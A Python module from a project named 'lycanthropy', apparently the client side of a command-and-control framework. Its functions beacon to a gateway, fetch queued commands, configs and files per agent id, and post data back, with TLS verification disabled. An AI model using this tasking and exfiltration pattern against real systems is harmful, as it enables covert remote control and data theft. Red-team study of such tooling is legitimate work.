import requests
import urllib3
import base64
import json
import lycanthropy.daemon.util

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def getHeartbeat(acid,gateway):
    #returns number of tasks
    uri = '/3/0/{}'.format(acid)
    return requests.get(
        'https://{}:56114{}'.format(gateway,uri),
        verify=False
    ).content.decode('utf-8')

def getCommand(acid,ctrlKey,gateway):
    #returns existing commands for acid
    fmtKey = base64.urlsafe_b64encode(base64.b64decode(ctrlKey)).decode('utf-8')
    uri = '/0/1/{}/{}'.format(fmtKey,acid)
    return requests.get(
        'https://{}:56114{}'.format(gateway,uri),
        verify=False
    ).content.decode('utf-8')

def getConfig(confKey,acid,gateway):
    #returns existing commands for acid
    fmtKey = base64.urlsafe_b64encode(base64.b64decode(confKey)).decode('utf-8')
    uri = '/4/0/{}/{}'.format(fmtKey,acid)
    return requests.get(
        'https://{}:56114{}'.format(gateway,uri),
        verify=False
    ).content.decode('utf-8')


def postAuth(acid,postData,gateway):
    #returns cookie
    uri = '/1/0/{}'.format(acid)
    response = requests.post(
        'https://{}:56114{}'.format(gateway,uri),
        headers={'content-type':'application/json'},
        json=postData,
        verify=False
    )
    return response.content.decode('utf-8')

def getFile(acid,distKey,file,gateway):
    #returns bytes object
    fmtKey = base64.urlsafe_b64encode(base64.b64decode(distKey)).decode('utf-8')
    rtype = lycanthropy.daemon.util.chkRtype(file)
    fmtFile = file.split('|')[0]
    uri = '/2/0/{}/{}?_key={}&_rtype={}'.format(acid,fmtFile,fmtKey,rtype)

    distResponse = requests.get(
        'https://{}:56114{}'.format(gateway,uri),
        verify=False
    )
    distResponse.encoding = 'utf-8'
    print(distResponse)
    return distResponse.content.decode('utf-8')

def postData(acid,secret,postData,gateway):
    #returns continue or ok
    uri = '/0/0/{}'.format(acid)
    monToken = lycanthropy.daemon.util.mkToken(postData,acid,secret)
    response = requests.post(
        'https://{}:56114{}'.format(gateway,uri),
        headers={'content-type': 'application/json'},
        json=postData,
        cookies={'_lmt':monToken},
        verify=False
    )
    return response.content.decode('utf-8')
